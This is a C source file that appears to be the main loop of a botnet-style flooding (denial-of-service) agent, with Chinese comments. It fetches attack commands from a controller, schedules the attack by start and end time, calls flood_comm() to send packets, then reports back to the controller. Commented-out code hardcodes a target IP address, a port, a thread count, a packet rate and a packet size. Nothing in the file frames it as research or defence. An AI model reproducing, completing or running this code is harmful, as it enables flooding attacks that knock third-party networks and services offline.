#include "ctrl.h"
#include <time.h>

 char  source_ip[16];
 char local_ip[16];
extern  char att_ip[15];
char gate_mac[30];
struct command* cmd; 
extern int pid[CHLD_MAX];

int main(int argc,char *argv[])
{  
	 struct in_addr addr1;
	 time_t now,start,end;
	
 	getRequest(argc,argv,"att");//请求发送:wait for attacking commands
	cmd=getCMD();
	printCMD(cmd);
/*	if(argc<5) return ;
	cmd=(struct command*)malloc(sizeof(struct command));
	cmd->att_ip=inet_addr("222.195.151.241");
	cmd->port=30000;
	cmd->threadnumber=4;
	cmd->type=atoi(argv[4]);
	cmd->rate=50000;
	cmd->pkt_size=1050;                              //设置本次攻击的目的地址、端口、线程数量、攻击类型、攻击的速率以及数据包的大小＊＊
	
	cmd->starttime.sec=atoi(argv[3]);
	cmd->starttime.min=atoi(argv[2]);
	cmd->starttime.hour=atoi(argv[1]);
	cmd->starttime.day=22;
	cmd->starttime.mon=3;
	cmd->starttime.year=2010;                     //设置攻击的起始时间＊＊

	cmd->endtime.sec=cmd->starttime.sec+20;
	cmd->endtime.min=cmd->starttime.min;
	cmd->endtime.hour=cmd->starttime.hour;
	cmd->endtime.day=cmd->starttime.day;
	cmd->endtime.mon=cmd->starttime.mon;
	cmd->endtime.year=cmd->starttime.year;        //设置攻击的结束时间＊＊
/*	cmd=(struct command*)malloc(sizeof(struct command));
	cmd->att_ip=inet_addr("222.195.151.241");
	cmd->port=1500;
	cmd->threadnumber=4;
	cmd->type=1;
	cmd->rate=50000;
	cmd->pkt_size=0;
	
	cmd->starttime.sec=0;
	cmd->starttime.min=7;
	cmd->starttime.hour=21;
	cmd->starttime.day=16;
	cmd->starttime.mon=3;
	cmd->starttime.year=2010;

	cmd->endtime.sec=cmd->starttime.sec+30;
	cmd->endtime.min=cmd->starttime.min;
	cmd->endtime.hour=cmd->starttime.hour;
	cmd->endtime.day=cmd->starttime.day;
	cmd->endtime.mon=cmd->starttime.mon;
	cmd->endtime.year=cmd->starttime.year;
	for(;cmd->type<5;cmd->type++,cmd->starttime.min++,cmd->endtime.min++)
  {*/
//	printCMD(cmd);
 
  memcpy(&addr1, &(cmd->att_ip), 4);                 //将cmd->att_ip赋值给addr1**
    getlocalip(local_ip);                            //获取本地地址＊＊
    memcpy(att_ip,(char *)inet_ntoa(addr1),15);      //将地址addr1赋给att_ip,其中函数inet_ntoa(addr1)将一个用数值型所表示的地址addr1转换成以“.” 间隔的诸如“a.b.c.d”的字符串形式。＊＊
                                                     // 注意inet_ntoa()返回的字符串存放在WINDOWS套接口实现所分配的内存中。＊＊
   get_dest_mac(local_ip,att_ip,gate_mac);           //获取目的地址IP＊＊
   
  
   start=switchtime(cmd->starttime);                 //将输入的开始时间赋值给信定义的结构体变量start**
   end=switchtime(cmd->endtime);                     //将输入的开始时间赋值给信定义的结构体变量end**
   now=time(NULL);                                   //获取当前系统时间＊＊
 //  printf("%d   %d\n",(int)start,(int)now);          //将开始时间和当前时间输出＊＊
   if(start<now)
   { printf("starttime has gone\n");
     return 0;
   }                          //如果开始时间比当前时间小返回零＊＊
   while(start>now) {sleep(1);now++;}                //如果开始时间比当前时间大程序暂停一下，当前时间加1秒＊＊
    flood_comm();                                    //发送数据包进行攻击＊＊
    now=time(NULL);                                  //攻击之后获取一下系统时间以便进行下一步的比较＊＊
    while(end>now) {sleep(1);now++;}                 //当截止时间大于当前时间时暂停一下，当前时间加一秒＊＊
	on_stop();                                   //停止攻击＊＊
//  }
      send_to_ctrl();
     printf("goodbye\n");
   return 1;
}
